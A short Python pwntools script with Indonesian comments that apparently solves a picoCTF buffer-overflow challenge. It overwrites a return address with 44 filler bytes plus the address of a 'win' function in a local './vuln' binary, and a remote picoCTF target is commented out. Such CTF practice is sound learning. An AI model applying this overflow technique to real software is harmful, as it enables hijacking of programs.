from pwn import *

# Target eksekusi (lokal)
p = process('./vuln')

# p = remote('saturn.picoctf.net', 53916)

# --- FASE 3: SUSUN PAYLOAD ---
offset = 44
# Ganti dengan alamat fungsi win yang Anda temukan di GDB
alamat_win = 0x80491f6 

# Rangkai peluru: 44 karakter sampah + alamat win 
# p32() digunakan untuk mengubah format hex menjadi urutan byte yang bisa dibaca CPU (Little Endian)
payload = b"A" * offset + p32(alamat_win)

# --- FASE 4: TEMBAK ---
# Tunggu sampai program memunculkan teks permintaan input
p.recvuntil(b"Please enter your string: \n")    

# Tembakkan payload
p.sendline(payload)

# Ambil alih interaksi untuk melihat output (flag)
p.interactive()